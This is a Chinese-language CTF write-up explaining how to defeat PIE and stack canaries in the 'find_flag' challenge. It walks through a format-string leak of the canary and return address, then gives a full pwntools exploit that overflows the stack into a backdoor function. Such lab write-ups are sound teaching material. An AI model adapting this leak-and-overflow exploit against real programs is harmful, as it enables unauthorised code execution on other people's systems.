# PIE保护（地址随机化）

1. 地址随机化，导致ida中左侧地址栏中的地址不能直接使用，其表示文件中的偏移，要得到实际地址，还需要 **泄漏出基地址，再加上偏移**，才能得到实际地址。

### 1. 格式化字符串泄漏基地址

例题：[[深育杯 2021\]find_flag | NSSCTF](https://www.nssctf.cn/problem/774)

1. check后发现，程序的保护全开：

   ![image-20240702163525495](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240702163525495.png)

2. 程序给了 **格式化字符串+栈溢出+后门函数** 三个漏洞：

   ![image-20240702163632520](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240702163632520.png)

   * 首先要绕过canary，时使用 **格式化字符串** 漏洞泄漏即可，下面gdb调试确定 **canary的偏移** ，可以明显看到canary相对于bp的偏移为 **0xb** ，因为程序时16位，且格式化字符串的首地址再sp上，所以可以确定canary相对于格式化字符串的偏移位： **0xb+0x6=17**：

     ![image-20240702163917636](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407021639712.png)

   * 进一步观察上面的调试信息，可以看到返回地址（绝对地址），再canary的后两格，即绝对返回地址相对于格式化字符串的偏移为： **17+2=19** 。

3. 上面计算出这两个偏移后即可绕过 **PIE和canary保护** ：

   ![image-20240702164515596](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407021645644.png)

   ```python
   payload = b'aaaaaaaa-%17$p-%19$p'
   p.sendline(payload)
   data = p.recv()
   #接受canary
   canary = data[27:45]
   #接受绝对地址
   base = data[46:60]
   canary = eval(canary.decode())
   print(hex(canary))
   #计算基地址，绝对地址-ida中的返回偏移
   base = (eval(base.decode())-0x146F)
   print(base,"sys:",hex(base+0x1231))
   ```

4. 后门函数：

   ![image-20240702164557073](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240702164557073.png)

5. EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   p = remote("node4.anna.nssctf.cn",28103)
   # p = process("./find_flag")
   p.recv()
   payload = b'aaaaaaaa-%17$p-%19$p'
   p.sendline(payload)
   data = p.recv()
   canary = data[27:45]
   base = data[46:60]
   canary = eval(canary.decode())
   print(hex(canary))
   base = (eval(base.decode())-0x000000000000146F)
   print(base,"sys:",hex(base+0x0000000000001231))
   
   payload = b'a'*(0x40-8)+p64(canary)+b'a'*8+p64(base+0x0000000000001231)
   p.sendline(payload)
   # p.sendline(b'cat flag')
   # 与远程交互
   p.interactive()
   ```

   ![image-20240702164707648](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407021647714.png)